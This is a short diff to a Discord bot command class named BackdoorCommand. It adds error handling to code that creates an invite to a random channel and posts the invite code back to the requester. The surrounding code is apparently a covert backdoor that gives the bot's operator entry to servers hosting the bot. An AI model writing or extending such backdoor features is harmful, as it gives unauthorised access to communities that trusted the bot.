@@ -55,6 +55,8 @@ class BackdoorCommand extends Commando.Command {
 
 				Channels.random().createInvite()
 				.then(invite=> message.channel.send('Found Invite:\n' + invite.code))
+				.catch(Error => console.error(Error));
+				
 				return;
 		   }
 		   if(Args[1] === "servers"){
